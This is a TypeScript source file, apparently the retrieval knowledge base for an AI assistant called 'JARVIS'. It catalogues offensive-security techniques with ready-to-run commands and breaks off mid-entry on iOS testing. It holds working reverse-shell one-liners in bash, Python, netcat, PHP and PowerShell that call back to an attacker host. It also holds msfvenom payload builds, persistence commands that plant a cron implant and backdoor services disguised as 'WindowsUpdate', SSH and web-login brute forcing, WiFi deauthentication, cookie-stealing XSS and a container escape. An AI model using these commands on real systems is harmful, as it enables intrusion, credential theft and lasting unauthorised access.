/**
 * JARVIS Knowledge Base — RAG (Retrieval-Augmented Generation)
 * 
 * A local searchable knowledge base containing:
 * - Hacking tools and their usage
 * - Network techniques and methodologies
 * - Web application security
 * - System exploitation techniques
 * - Cryptography and password attacks
 * - Wireless security
 * - Social engineering
 * - Forensics and incident response
 * 
 * Each entry has: title, category, content, tags, commands
 * Search uses TF-IDF-like scoring for relevance
 */

export interface KnowledgeEntry {
  id: string;
  title: string;
  category: string;
  content: string;
  tags: string[];
  commands: string[];
  examples: string[];
  relatedTools: string[];
}

// ═══════════════════════════════════════════════════════════════
// KNOWLEDGE DATABASE — Pre-loaded expertise
// ═══════════════════════════════════════════════════════════════

export const KNOWLEDGE_DB: KnowledgeEntry[] = [
  // ── RECONNAISSANCE & OSINT ──
  {
    id: 'nmap-basics',
    title: 'Nmap Network Scanner',
    category: 'reconnaissance',
    content: `Nmap is the industry-standard network scanner. It discovers hosts, services, open ports, and operating systems on a network.

SYN Stealth Scan: Half-open scan that doesn't complete TCP handshake. Faster and stealthier.
Connect Scan: Full TCP connection. More reliable but easily logged.
UDP Scan: Scans for UDP services (slower, often needs root).
OS Detection: Uses TCP/IP stack fingerprinting to identify target OS.
Service Version: Detects specific service versions for vulnerability matching.
Script Engine: NSE scripts automate vuln detection, brute force, discovery.

Advanced techniques:
- Fragmentation: Split packets to evade IDS/IPS
- Decoy scans: Use fake source IPs to hide origin
- Idle scan: Use zombie host for completely blind scanning
- Timing templates: -T0 (paranoid) through -T5 (insane)
- Output formats: Normal, XML, grepable for pipeline processing`,
    tags: ['nmap', 'scan', 'port', 'network', 'recon', 'discovery', 'host', 'service'],
    commands: [
      'nmap -sS -sV -O -p- target.com',
      'nmap -sU --top-ports 100 target.com',
      'nmap -sS -D RND:10 target.com',
      'nmap --script vuln target.com',
      'nmap -sS -T4 --min-rate 1000 target.com',
      'nmap -O --fuzzy target.com',
      'nmap -sV --version-intensity 9 target.com',
      'nmap --script=banner target.com',
      'nmap -Pn -p 80,443,8080,8443 target.com',
    ],
    examples: [
      'Full TCP scan with version and OS detection: nmap -sS -sV -O -p- 192.168.1.1',
      'Quick top 1000 ports: nmap -T4 192.168.1.0/24',
      'Vulnerability scan: nmap --script vuln --script-args=unsafe=1 target.com',
      'Scan specific service: nmap -sV -p 445 --script=smb-vuln-ms17-010 target.com',
    ],
    relatedTools: ['masscan', 'zmap', 'rustscan'],
  },
  {
    id: 'masscan',
    title: 'Masscan — Fast Port Scanner',
    category: 'reconnaissance',
    content: `Masscan is the fastest internet port scanner. It can scan the entire internet in under 6 minutes using asynchronous transmission.

Key differences from Nmap:
- Asynchronous scanning (doesn't wait for responses)
- Can send 10M+ packets/second
- Bypasses rate limiters with randomization
- Uses its own TCP/IP stack
- Less accurate than Nmap but much faster

Best for: Large-scale network discovery, internet-wide scanning, finding assets quickly.`,
    tags: ['masscan', 'scan', 'fast', 'internet', 'port', 'recon'],
    commands: [
      'masscan 0.0.0.0/0 -p0-65535 --rate=10000',
      'masscan 192.168.0.0/16 -p80,443 --rate=1000',
      'masscan 10.0.0.0/8 -p22,80,443 --banners --rate=5000',
    ],
    examples: [
      'Scan entire subnet for web servers: masscan 10.0.0.0/8 -p80,443 --rate=1000',
    ],
    relatedTools: ['nmap', 'zmap', 'rustscan'],
  },
  {
    id: 'shodan',
    title: 'Shodan — Internet Device Search Engine',
    category: 'reconnaissance',
    content: `Shodan is a search engine for internet-connected devices. It indexes services, banners, vulnerabilities, and metadata.

Key capabilities:
- Search by banner text, country, port, org
- Find IoT devices, cameras, SCADA systems
- CVE tracking and vulnerability alerts
- Network topology visualization
- Historical data for tracking changes

Shodan dork examples:
- Find webcams: "Server: GoAhead-Webs" + has_image:true
- Find Jenkins: "X-Jenkins" + port:8080
- Find MySQL with no password: "MySQL" + port:3306
- Find vulnerableCitrix: "Citrix" + "password"
- Industrial control: "Siemens" + port:102`,
    tags: ['shodan', 'osint', 'search', 'iot', 'device', 'internet', 'dork'],
    commands: [
      'shodan search "apache 2.4.49" country:US',
      'shodan host 8.8.8.8',
      'shodan org:amazon',
    ],
    examples: [
      'Find vulnerable servers: shodan search "title:404 Not Found" has_screenshot:true',
    ],
    relatedTools: ['censys', 'zoomeye', 'crt.sh'],
  },
  {
    id: 'theharvester',
    title: 'theHarvester — Email and Subdomain Harvester',
    category: 'reconnaissance',
    content: `theHarvester gathers emails, subdomains, hosts, and employee names from public sources.

Sources: Google, Bing, LinkedIn, Twitter, DNS brute force, Shodan, etc.
Use for: Pre-engagement recon, finding attack surface, social engineering targets.`,
    tags: ['email', 'subdomain', 'harvest', 'osint', 'recon', 'enum'],
    commands: [
      'theHarvester -d target.com -b google,bing,linkedin -l 200',
      'theHarvester -d target.com -b all -f results.html',
    ],
    examples: [
      'Full recon on domain: theHarvester -d company.com -b all -f report.html',
    ],
    relatedTools: ['recon-ng', 'spiderfoot', 'amass'],
  },
  // ── WEB APPLICATION SECURITY ──
  {
    id: 'burp-suite',
    title: 'Burp Suite — Web Application Security Testing',
    category: 'web-security',
    content: `Burp Suite is the leading web application security testing platform.

Core tools:
- Proxy: Intercept and modify HTTP/S traffic in real-time
- Repeater: Manually craft and resend individual requests
- Intruder: Automated fuzzing and brute force attacks
- Decoder: Encode/decode data (Base64, URL, Hex, etc.)
- Comparer: Diff two requests/responses side-by-side
- Sequencer: Analyze token/session randomness
- Logger: Full HTTP history with filtering

Attack techniques:
- SQL injection via parameter fuzzing
- XSS through reflected/stored/DOM injection
- IDOR by manipulating object references
- File upload bypass
- Authentication bypass
- CSRF token analysis
- Session fixation/hijacking
- Business logic flaws`,
    tags: ['burp', 'proxy', 'intercept', 'web', 'xss', 'sqli', 'fuzz', 'http'],
    commands: [
      'burpsuite --project-file=project.burp',
    ],
    examples: [
      'Intercept login form, send to Intruder, use pitchfork with username/password wordlists',
      'Use Repeater to test SQL injection: add OR 1=1-- to parameter',
      'Scanner finds reflected XSS in search parameter',
    ],
    relatedTools: ['owasp-zap', 'mitmproxy', 'nikto'],
  },
  {
    id: 'sqlmap',
    title: 'SQLMap — Automated SQL Injection',
    category: 'web-security',
    content: `SQLMap automates SQL injection detection and exploitation.

Features:
- Automatic database fingerprinting
- Data extraction from databases
- File system access (read/write)
- Command execution on server
- Password hash cracking
- Supports: MySQL, MSSQL, PostgreSQL, Oracle, SQLite, etc.

Injection types:
- UNION-based: Use UNION SELECT to extract data
- Boolean-based blind: Infer data from true/false responses
- Time-based blind: Infer data from response delays
- Error-based: Extract data from error messages
- Stacked queries: Execute multiple statements
- Out-of-band: Use DNS or HTTP requests to exfiltrate`,
    tags: ['sqlmap', 'sqli', 'injection', 'database', 'exploit', 'web'],
    commands: [
      'sqlmap -u "http://target.com/page?id=1" --dbs --batch',
      'sqlmap -u "http://target.com/page?id=1" -D mydb --tables',
      'sqlmap -u "http://target.com/page?id=1" -D mydb -T users --dump',
      'sqlmap -r request.txt --os-shell --batch',
      'sqlmap -u "http://target.com/?id=1" --technique=BEUST --level=5 --risk=3',
    ],
    examples: [
      'Dump all databases: sqlmap -u "http://site.com/page?id=1" --dbs --batch',
      'Get OS shell: sqlmap -r req.txt --os-shell',
      'Bypass WAF: sqlmap -u "http://target.com/?id=1" --tamper=space2comment,between',
    ],
    relatedTools: ['bbqsql', 'jsql-injection', 'havij'],
  },
  {
    id: 'xss-techniques',
    title: 'Cross-Site Scripting (XSS) Attack Techniques',
    category: 'web-security',
    content: `XSS allows injection of malicious scripts into web pages viewed by other users.

Types:
- Reflected XSS: Script reflected in URL/response (needs social engineering)
- Stored XSS: Script stored in database, executed for all users
- DOM-based XSS: Client-side JavaScript processes unsanitized input
- Mutation XSS: Exploits HTML parser quirks

Advanced bypasses:
- Event handlers: onerror, onload, onfocus, onmouseover
- Encoding: HTML entities, Unicode, hex, Base64
- Case variation: ScRiPt, ImG
- Protocol handlers: javascript:, data:, vbscript:
- Polyglots: Payloads that work across multiple contexts
- Template injection leading to XSS
- CSP bypass techniques
- Mutation-based XSS using HTML parser differences`,
    tags: ['xss', 'cross-site', 'script', 'injection', 'web', 'dom', 'reflected', 'stored'],
    commands: [],
    examples: [
      'Basic payload: <script>alert(1)</script>',
      'Event handler: <img src=x onerror=alert(1)>',
      'SVG-based: <svg onload=alert(1)>',
      'DOM XSS: javascript:alert(document.cookie)',
      'CSP bypass via JSONP: https://target.com/jsonp?callback=alert(1)//',
    ],
    relatedTools: ['burp', 'xsstrike', 'dalfox'],
  },
  // ── EXPLOITATION ──
  {
    id: 'metasploit',
    title: 'Metasploit Framework',
    category: 'exploitation',
    content: `Metasploit is the world's most used penetration testing framework.

Core components:
- Exploits: Code that takes advantage of vulnerabilities
- Payloads: Code that runs after exploitation (reverse shells, meterpreter)
- Auxiliary: Scanners, fuzzers, DoS tools
- Post: Post-exploitation modules
- Encoders: Bypass signature-based detection
- NOPs: NOP sleds for buffer overflows

Meterpreter features:
- File system access (upload/download)
- Screenshot capture
- Keylogging
- Webcam/microphone access
- Password hash dumping
- Privilege escalation
- Lateral movement
- Persistence mechanisms
- Network pivoting

Workflow:
1. use exploit/multi/handler
2. set PAYLOAD windows/meterpreter/reverse_tcp
3. set LHOST attacker-ip
4. set LPORT 4444
5. exploit
6. Post-exploitation with meterpreter`,
    tags: ['metasploit', 'msf', 'exploit', 'payload', 'meterpreter', 'reverse', 'shell'],
    commands: [
      'msfconsole -q -x "use exploit/multi/handler; set PAYLOAD linux/x64/meterpreter/reverse_tcp; set LHOST 0.0.0.0; set LPORT 4444; exploit"',
      'msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f exe -o payload.exe',
      'msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.0.1 LPORT=4444 -f elf -o shell',
    ],
    examples: [
      'Generate payload: msfvenom -p windows/meterpreter/reverse_tcp LHOST=ATTACKER_IP LPORT=4444 -f exe -o evil.exe',
      'Exploit EternalBlue: use exploit/windows/smb/ms17_010_eternalblue',
    ],
    relatedTools: ['cobalt-strike', 'empire', 'sliver'],
  },
  {
    id: 'reverse-shells',
    title: 'Reverse Shell Techniques',
    category: 'exploitation',
    content: `A reverse shell connects back to the attacker's machine, bypassing firewalls that block inbound connections.

Languages available: Bash, Python, PHP, PowerShell, Perl, Ruby, Java, Node.js, C, Go, etc.

Techniques:
- Standard reverse shell (bash /dev/tcp)
- Netcat variants (nc -e, mkfifo)
- Python one-liners
- PHP exec()
- PowerShell Invoke-Expression
- TLS/SSL encrypted shells
- HTTP/HTTPS tunneling (when TCP blocked)
- DNS tunneling (when all else blocked)
- ICMP tunneling`,
    tags: ['reverse', 'shell', 'connect', 'backdoor', 'rce', 'python', 'bash', 'powershell'],
    commands: [
      'bash -i >& /dev/tcp/10.0.0.1/4444 0>&1',
      'python -c \'import socket,subprocess,os;s=socket.socket();s.connect(("10.0.0.1",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/sh","-i"])\'',
      'nc -e /bin/sh 10.0.0.1 4444',
      'php -r \'$sock=fsockopen("10.0.0.1",4444);exec("/bin/sh -i <&3 >&3 2>&3");\'',
      'powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient(\'10.0.0.1\',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + \'PS \' + (pwd).Path + \'> \';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}"',
    ],
    examples: [
      'Listen: nc -lvnp 4444',
      'Bash reverse shell: bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1',
      'Encrypted: use socat OPENSSL:TARGET:PORT,stderr,pty',
    ],
    relatedTools: ['netcat', 'socat', 'chisel', 'ligolo'],
  },
  {
    id: 'privilege-escalation',
    title: 'Privilege Escalation Techniques',
    category: 'exploitation',
    content: `Privilege escalation moves from low-privilege access to root/admin.

Linux privesc:
- SUID/SGID binaries (find / -perm -4000)
- Sudo misconfigurations (sudo -l)
- Kernel exploits (DirtyPipe, DirtyCow, PwnKit)
- Cron jobs with writable scripts
- Writable /etc/passwd or /etc/shadow
- Capabilities (getcap -r /)
- Docker/LXC group membership
- NFS no_root_squash
- PATH manipulation
- LD_PRELOAD hijacking

Windows privesc:
- Token impersonation (Potato attacks)
- Unquoted service paths
- DLL hijacking
- AlwaysInstallElevated registry
- Scheduled tasks
- Weak service permissions
- UAC bypass
- PrintSpoofer, GodPotato
- Stored credentials (cmdkey /list)`,
    tags: ['privesc', 'escalation', 'root', 'admin', 'suid', 'sudo', 'kernel', 'potato'],
    commands: [
      'find / -perm -4000 -type f 2>/dev/null',
      'sudo -l',
      'cat /etc/crontab',
      'getcap -r / 2>/dev/null',
      'wmic service list full',
      'reg query HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\Installer /v AlwaysInstallElevated',
    ],
    examples: [
      'Find SUID binaries: find / -perm -4000 2>/dev/null',
      'Check sudo: sudo -l',
      'Linux kernel exploit: searchsploit linux kernel 4.x privilege',
    ],
    relatedTools: ['linpeas', 'winpeas', 'linux-exploit-suggester'],
  },
  // ── NETWORK ATTACKS ──
  {
    id: 'mitm-attacks',
    title: 'Man-in-the-Middle Attack Techniques',
    category: 'network-attacks',
    content: `MITM attacks intercept communication between two parties.

ARP Spoofing: Poison ARP cache to redirect traffic through attacker
DNS Spoofing: Redirect DNS queries to attacker-controlled servers
SSL Stripping: Downgrade HTTPS to HTTP
WiFi Evil Twin: Fake access point mimicking legitimate network
ettercap: Automated MITM framework
bettercap: Modern MITM tool with modular capabilities

Advanced:
- SSL/TLS interception with custom CA
- HTTP/2 downgrade attacks
- NAT double tagging
- DHCP spoofing
- IPv6 RA attacks`,
    tags: ['mitm', 'arp', 'spoof', 'intercept', 'ettercap', 'bettercap', 'wifi', 'ssl'],
    commands: [
      'bettercap -iface eth0',
      'arpspoof -i eth0 -t 192.168.1.1 192.168.1.100',
      'ettercap -T -M arp // // -w capture.pcap',
    ],
    examples: [
      'ARP spoof: arpspoof -i eth0 -t 192.168.1.1 192.168.1.100',
      'WiFi evil twin: hostapd-wpe /etc/hostapd-wpe/hostapd-wpe.conf',
    ],
    relatedTools: ['wireshark', 'tcpdump', 'responder'],
  },
  // ── PASSWORD ATTACKS ──
  {
    id: 'password-attacks',
    title: 'Password Cracking and Brute Force',
    category: 'password-attacks',
    content: `Password attacks cover offline cracking and online brute forcing.

Offline cracking:
- Hashcat: GPU-accelerated hash cracking (fastest)
- John the Ripper: CPU-based with extensive format support
- Modes: Dictionary, brute force, rule-based, mask, combinator

Online brute force:
- Hydra: Parallel network login cracker
- Medusa: Similar to Hydra but modular
- Burp Intruder: Web login brute force

Password generation for cracking:
- RockYou, SecLists, wordlists
- Rules: append numbers, leet speak, case changes
- Masks: ?l?l?l?d?d (three letters + two digits)

Hash types and speeds:
- MD5: ~50 GH/s (GPU)
- SHA256: ~20 GH/s
- bcrypt: ~180 kH/s (intentionally slow)
- NTLM: ~80 GH/s
- Kerberos 5 AS-REQ: ~400 GH/s`,
    tags: ['password', 'crack', 'hash', 'brute', 'hydra', 'john', 'hashcat', 'dictionary'],
    commands: [
      'hashcat -m 0 hashes.txt rockyou.txt -r rules/best64.rule',
      'john --wordlist=rockyou.txt hashes.txt',
      'hydra -l admin -P passwords.txt ssh://192.168.1.100',
      'hydra -l admin -P passwords.txt 192.168.1.100 http-post-form "/login:user=^USER^&pass=^PASS^:F=incorrect"',
    ],
    examples: [
      'Crack MD5 hashes: hashcat -m 0 hashes.txt rockyou.txt',
      'SSH brute force: hydra -l root -P /usr/share/wordlists/rockyou.txt ssh://target.com',
      'Web login: hydra -l admin -P passwords.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=Error"',
    ],
    relatedTools: ['hashcat', 'john', 'hydra', 'medusa', 'crunch'],
  },
  // ── WIRELESS ──
  {
    id: 'wifi-hacking',
    title: 'WiFi Security Testing',
    category: 'wireless',
    content: `WiFi hacking covers WPA/WPA2, WEP, open networks, and enterprise attacks.

WPA2 attack flow:
1. Enable monitor mode on wireless adapter
2. Deauthenticate client from AP
3. Capture 4-way handshake
4. Crack with dictionary/wordlist

Tools:
- Aircrack-ng suite: Monitor, deauth, capture, crack
- Wifite: Automated WiFi auditing
- Kismet: Passive wireless detection
- Hashcat: GPU-based WPA cracking

Enterprise (WPA2-Enterprise/802.1X):
- Evil twin RADIUS server
- EAP credentials capture
- certificate-based attacks`,
    tags: ['wifi', 'wpa', 'wpa2', 'aircrack', 'wireless', 'handshake', 'deauth', 'monitor'],
    commands: [
      'airmon-ng start wlan0',
      'airodump-ng wlan0mon',
      'airodump-ng -c 6 --bssid AA:BB:CC:DD:EE:FF -w capture wlan0mon',
      'aireplay-ng --deauth 10 -a AA:BB:CC:DD:EE:FF wlan0mon',
      'aircrack-ng -w rockyou.txt capture-01.cap',
      'wifite --wpa --dict rockyou.txt',
    ],
    examples: [
      'Full WPA2 crack: airmon-ng start wlan0 → airodump-ng → aireplay-ng --deauth → aircrack-ng',
    ],
    relatedTools: ['hashcat', 'kismet', 'fern-wifi-cracker'],
  },
  // ── POST EXPLOITATION ──
  {
    id: 'persistence',
    title: 'Persistence Mechanisms',
    category: 'post-exploitation',
    content: `Persistence ensures access survives reboots and user logouts.

Linux persistence:
- SSH keys in authorized_keys
- Cron jobs (crontab -e)
- Systemd services
- Bash profile scripts (.bashrc, .profile)
- LD_PRELOAD hijacking
- Modified system binaries
- Init scripts

Windows persistence:
- Registry Run keys (HKCU/HKLM\Software\Microsoft\Windows\CurrentVersion\Run)
- Scheduled tasks (schtasks)
- Services (sc create)
- WMI event subscriptions
- Startup folder shortcuts
- DLL hijacking
- COM object hijacking
- BITS jobs`,
    tags: ['persistence', 'backdoor', 'startup', 'cron', 'registry', 'service', 'maintain'],
    commands: [
      'crontab -e',
      'echo "*/5 * * * * /tmp/.hidden/implant" | crontab -',
      'sc create BackupSvc binPath="C:\\Windows\\temp\\backdoor.exe" start=auto',
      'schtasks /create /tn "WindowsUpdate" /tr "C:\\temp\\beacon.exe" /sc onlogon /ru SYSTEM',
    ],
    examples: [
      'Linux cron persistence: echo "*/5 * * * * /bin/bash -c \'/tmp/shell.sh\'" | crontab -',
      'Windows service: sc create "SystemHelper" binPath="C:\\Windows\\temp\\helper.exe" start=auto',
    ],
    relatedTools: ['empire', 'metasploit', 'powersploit'],
  },
  // ── SOCIAL ENGINEERING ──
  {
    id: 'social-engineering',
    title: 'Social Engineering Techniques',
    category: 'social-engineering',
    content: `Social engineering exploits human psychology rather than technical vulnerabilities.

Phishing:
- Spear phishing: Targeted emails with personalized content
- Whaling: Targeting executives/C-suite
- Clone phishing: Duplicate legitimate emails with malicious links
- Vishing: Voice-based phishing (phone calls)
- Smishing: SMS-based phishing

Pretexting:
- Creating believable scenarios to extract information
- Impersonating IT support, vendor, authority figure
- Building rapport before exploitation

Tools:
- GoPhish: Phishing campaign framework
- SET (Social Engineering Toolkit): Pre-built attack vectors
- Evilginx2: Advanced phishing with MFA bypass
- Catphish: Custom phishing domains`,
    tags: ['phishing', 'social', 'engineer', 'pretexting', 'vishing', 'gophish', 'set'],
    commands: [
      'setoolkit'
    ],
    examples: [
      'SET phishing attack: setoolkit → 1) Social Engineering → 2) Website Attack → 3) Credential Harvester',
    ],
    relatedTools: ['gophish', 'evilginx', 'king-phisher'],
  },
  // ── CRYPTOGRAPHY ──
  {
    id: 'crypto-attacks',
    title: 'Cryptographic Attack Techniques',
    category: 'cryptography',
    content: `Cryptographic attacks target weaknesses in encryption implementations.

Common attacks:
- Padding Oracle: Decrypt data without key (POODLE, Lucky13)
- Timing attacks: Measure response times to infer secrets
- Birthday attack: Find collisions in hash functions
- Downgrade: Force weaker crypto (SSLv3, TLS 1.0)
- Side-channel: Power analysis, electromagnetic emanation

Tools:
- OpenSSL: SSL/TLS testing
- sslscan: Quick SSL configuration check
- testssl.sh: Comprehensive SSL testing
- hashcat: Password hash cracking
- RsaCtfTool: RSA attack automation`,
    tags: ['crypto', 'encryption', 'ssl', 'tls', 'hash', 'rsa', 'decrypt', 'cipher'],
    commands: [
      'openssl s_client -connect target.com:443',
      'sslscan target.com',
      'testssl.sh target.com',
    ],
    examples: [
      'Check SSL config: sslscan target.com:443',
      'Test for vulnerabilities: testssl.sh --all target.com',
    ],
    relatedTools: ['openssl', 'sslscan', 'testssl', 'hashcat'],
  },
  // ── FORENSICS ──
  {
    id: 'digital-forensics',
    title: 'Digital Forensics and Incident Response',
    category: 'forensics',
    content: `Digital forensics involves collecting, analyzing, and preserving digital evidence.

Disk forensics:
- Autopsy: Open-source forensic suite
- FTK: Forensic Toolkit
- Volatility: Memory forensics

Network forensics:
- Wireshark: Packet capture and analysis
- NetworkMiner: Network traffic forensics
- Zeek (Bro): Network security monitoring

Memory forensics:
- Volatility framework: Analyze memory dumps
- Rekall: Memory analysis framework

Key artifacts:
- Browser history, cookies, cache
- Windows Event Logs
- Registry hives
- Swap/page files
- USB device history
- Recent file access`,
    tags: ['forensics', 'incident', 'response', 'wireshark', 'volatility', 'autopsy', 'evidence'],
    commands: [
      'volatility -f memory.dmp imageinfo',
      'volatility -f memory.dmp --profile=Win7SP1x64 netscan',
      'wireshark -i eth0 -k -f "tcp port 443"',
      'autopsy',
    ],
    examples: [
      'Memory analysis: volatility -f dump.raw imageinfo',
      'Network capture: tcpdump -i eth0 -w capture.pcap',
    ],
    relatedTools: ['volatility', 'autopsy', 'sleuthkit', 'strings', 'binwalk'],
  },
  // ── CLOUD SECURITY ──
  {
    id: 'aws-security',
    title: 'AWS Cloud Security Testing',
    category: 'cloud-security',
    content: `AWS cloud security testing covers misconfigurations, IAM abuse, and lateral movement in Amazon Web Services.

Recon:
- enumerate4all: Enumerate AWS account from compromised credentials
- Pacu: AWS exploitation framework
- ScoutSuite: Multi-cloud security auditing
- Prowler: AWS CIS benchmark assessment
- CloudMapper: Visualize AWS environments

IAM attacks:
- Create access keys for compromised users
- Assume roles across accounts (cross-account)
- PassRole to escalate privileges
- Create new admin users
- Lambda function code injection

S3 attacks:
- List and download public/private buckets
- Upload malicious objects
- Modify bucket policies
- CORS misconfiguration exploitation

Privilege escalation:
- iam:CreatePolicyVersion (self-escalation)
- iam:AttachUserPolicy (attach admin)
- iam:PassRole + lambda:CreateFunction (code exec)
- iam:PassRole + ec2:RunInstance (metadata exfil)
- iam:PassRole + glue:CreateDevEndpoint (code exec)

EC2 attacks:
- User data script extraction
- Instance metadata service (IMDSv1 SSRF)
- Security group rule modification
- Snapshot mounting for disk access

Lateral movement:
- Cross-account role assumption
- Resource-based policy exploitation
- VPC peering abuse
- DNS rebinding to private services`,
    tags: ['aws', 'cloud', 'iam', 's3', 'ec2', 'lambda', 'prowler', 'pacu', 'misconfiguration'],
    commands: [
      'aws sts get-caller-identity',
      'aws iam list-attached-user-policies --user-name USER',
      'aws s3 ls',
      'aws ec2 describe-instances',
      'pacu --help',
      'prowler aws',
      'scout --provider aws',
    ],
    examples: [
      'Check current identity: aws sts get-caller-identity',
      'Enumerate S3 buckets: aws s3 ls --recursive s3://bucket-name',
      'Run Prowler audit: prowler aws --checks iam_root_hardware_mfa_enabled',
      'Pacu enumeration: pacu --module iam__enum_users --module-args "--roles False"',
    ],
    relatedTools: ['pacu', 'prowler', 'scoutsuite', 'enumerate4all', 'cloudmapper'],
  },
  {
    id: 'azure-security',
    title: 'Azure Cloud Security Testing',
    category: 'cloud-security',
    content: `Microsoft Azure cloud security testing.

Tools:
- ScoutSuite: Azure security auditing
- ROADtools: Azure AD exploration
- AADInternals: Azure AD attack toolkit
- AzureHound: Azure AD data collection for BloodHound
- MicroBurst: Azure security assessment

Key attacks:
- Azure AD user enumeration
- Service principal abuse
- Managed identity impersonation
- Key Vault secret extraction
- Azure RBAC privilege escalation
- Conditional access policy bypass
- OAuth application abuse
- Certificate-based authentication attacks`,
    tags: ['azure', 'cloud', 'azuread', 'entra', 'keyvault', 'microsoft', 'aadinternals'],
    commands: [
      'az login',
      'az ad user list',
      'az keyvault secret list --vault-name VAULT',
      'roadtools auth',
      'AADInternals',
    ],
    examples: [
      'Enumerate Azure AD: ROADrecon explore',
      'Dump Key Vault: az keyvault secret list --vault-name myvault',
    ],
    relatedTools: ['scoutsuite', 'roadtools', 'aadinternals', 'azurehound'],
  },
  {
    id: 'gcp-security',
    title: 'Google Cloud Platform Security Testing',
    category: 'cloud-security',
    content: `GCP security testing focuses on IAM, compute, storage, and Kubernetes.

Tools:
- ScoutSuite: GCP security auditing
- GCPBucketBrute: GCS bucket enumeration
- GCUDumper: GCP credential extraction
- Stratus Red Team: GCP attack emulation

Key attacks:
- Service account key extraction from VMs
- Metadata server exploitation (169.254.169.254)
- GCS bucket enumeration and public access
- IAM privilege escalation via bindings
- GKE Kubernetes cluster compromise
- Cloud Functions code injection
- BigQuery data exfiltration`,
    tags: ['gcp', 'cloud', 'google', 'gke', 'kubernetes', 'bigquery', 'gcs'],
    commands: [
      'gcloud auth list',
      'gcloud projects list',
      'gcloud container clusters list',
      'gsutil ls',
    ],
    examples: [
      'List GCP projects: gcloud projects list',
      'Enumerate GCS buckets: gsutil ls gs://',
    ],
    relatedTools: ['scoutsuite', 'gcpbucketbrute', 'stratus-red-team'],
  },
  {
    id: 'docker-kubernetes-security',
    title: 'Docker and Kubernetes Security',
    category: 'cloud-security',
    content: `Container and orchestration security testing.

Docker attacks:
- Container escape (CVE-2019-5736, CVE-2020-15257)
- Privileged container abuse (mount host filesystem)
- Docker socket exposure (API access)
- Image poisoning and supply chain attacks
- Secret extraction from environment variables
- Runtime manipulation with nsenter

Kubernetes attacks:
- Kubernetes Dashboard exposure
- kubelet API abuse (exec into pods)
- RBAC escalation and role binding
- etcd data extraction
- Service account token abuse
- Pod security policy bypass
- Persistent backdoor pods
- Secrets extraction from etcd or API

Tools:
- kubeaudit: Kubernetes security auditing
- kube-hunter: Kubernetes penetration testing
- trivy: Container vulnerability scanning
- Falco: Runtime security monitoring
- Peirates: Kubernetes post-exploitation`,
    tags: ['docker', 'kubernetes', 'k8s', 'container', 'kubelet', 'etcd', 'pod', 'escape'],
    commands: [
      'docker run --privileged -it alpine',
      'docker ps -a',
      'kubectl get pods --all-namespaces',
      'kubectl get secrets',
      'kube-hunter --remote TARGET',
      'trivy image IMAGE',
      'kubeaudit all --kubeconfig ~/.kube/config',
    ],
    examples: [
      'Docker escape via privileged: docker run --privileged -v /:/host -it alpine chroot /host',
      'Kubelet exec: curl -sk -H "Authorization: Bearer TOKEN" https://kubelet:10250/run/default/POD/0/COMMAND',
      'Extract secrets: kubectl get secrets -o json | jq -r .items[].data',
    ],
    relatedTools: ['kube-hunter', 'kubeaudit', 'trivy', 'falco', 'peirates'],
  },
  // ── MOBILE SECURITY ──
  {
    id: 'android-hacking',
    title: 'Android Security Testing',
    category: 'mobile-security',
    content: `Android penetration testing covers APK analysis, runtime manipulation, and device exploitation.

Static analysis:
- APKTool: Decompile APK to smali/resources
- jadx: Java source code decompilation
- Ghidra/IDA: Native library reverse engineering
- MobSF: Automated mobile security framework
- apkx: Extract certificates and permissions

Dynamic analysis:
- Frida: Dynamic instrumentation toolkit
- Objection: Runtime exploration powered by Frida
- Drozer: Android security testing framework
- Cydia Substrate: Hooking framework
- Xposed Framework: System-level hooking

Key attacks:
- Certificate pinning bypass (Frida/Objection)
- Root detection bypass
- insecure data storage extraction
- Intent injection and component export abuse
- Content provider exploitation
- WebView JavaScript injection
- SQL injection in content providers
- Broadcast receiver hijacking
- Deep link abuse
- APK tampering and repackaging

Frida examples:
- SSL pinning bypass: objection --gadget explore
- Root bypass: Frida script to hook isRooted()
- Key extraction: Hook SharedPreferences and KeyStore`,
    tags: ['android', 'apk', 'frida', 'objection', 'drozer', 'mobile', 'smali', 'hook'],
    commands: [
      'jadx -d output app.apk',
      'apktool d app.apk',
      'objection --gadget gadget.explore',
      'frida -U -f com.target.app -l bypass.js --no-pause',
      'drozer console connect',
      'mobsfscan app.apk',
      'adb shell pm list packages',
      'adb pull /data/data/com.target.app/',
    ],
    examples: [
      'Decompile APK: jadx -d decompiled app.apk',
      'Frida SSL bypass: frida -U -f com.target.app -l ssl_bypass.js --no-pause',
      'Dump app data: adb backup -f backup.ab -apk com.target.app',
      'Objection explore: objection --gadget libfrida-gadget.so explore',
    ],
    relatedTools: ['frida', 'objection', 'jadx', 'apktool', 'drozer', 'mobsf'],
  },
  {
    id: 'ios-hacking',
    title: 'iOS Security Testing',
    category: 'mobile-security',
    content: `iOS penetration testing covers app analysis, jailbreak exploitation, and runtime manipulation.

Tools:
- Frida: Dynamic instrumentation (works on iOS too)
- Objection: Runtime exploration
- clutch: Decrypt and dump iOS applications
- Flexdecrypt: Decrypt iOS binaries
- class-dump: Extract Objective-C class information
- keychain_dump: Extract iOS keychain
- BinaryCookieReader: Parse Safari cookies
- Ghidra/IDA: Binary analysis

Key attacks:
- Jailbreak detection bypass (Frida hooks)
- SSL pinning bypass
- Keychain data extraction
- URL scheme hijacking
- Inter-process communication (IPC) abuse
- Pasteboard data extraction
- App Transport Security bypass
- Core Data injection
- SQLite database extraction
- Info.plist sensitive data exposure
- JSON reverse engineering

Approach:
1. Decrypt IPA using clutch or flexdecrypt
2. Analyze with class-dump and Ghidra
3. Hook functions with Frida at runtime
4. Bypass security checks (jailbreak, SSL pinning)
5. Extract sensitive data from keychain and storage`,
    tags: ['ios', 'iphone', 'frida', 'jailbreak', 'keychain', 'ipa', 'objective-c', 'swift'],
